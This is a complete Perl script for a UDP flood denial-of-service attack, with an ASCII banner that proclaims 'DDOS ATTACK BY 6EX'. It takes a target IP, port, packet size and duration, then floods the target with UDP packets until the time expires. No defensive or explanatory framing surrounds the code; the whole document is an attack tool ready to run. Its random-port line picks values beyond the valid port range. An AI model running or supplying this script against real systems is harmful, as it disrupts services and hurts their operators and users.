#!/usr/bin/perl

##
# DgH By SnowmaN<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;


░█████╗░███████╗██╗░░██╗
██╔═══╝░██╔════╝╚██╗██╔╝
██████╗░█████╗░░░╚███╔╝░
██╔══██╗██╔══╝░░░██╔██╗░
╚█████╔╝███████╗██╔╝╚██╗
░╚════╝░╚══════╝╚═╝░░╚═╝

DDOS ATTACK BY 6EX, SHEEEESH THIS HITS HARDD
EOTEXT
print "Attacking $ip on port " . ($port ? $port : "random") . "" .
  ($size ? " with a $size-byte attack" : "") . "" .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}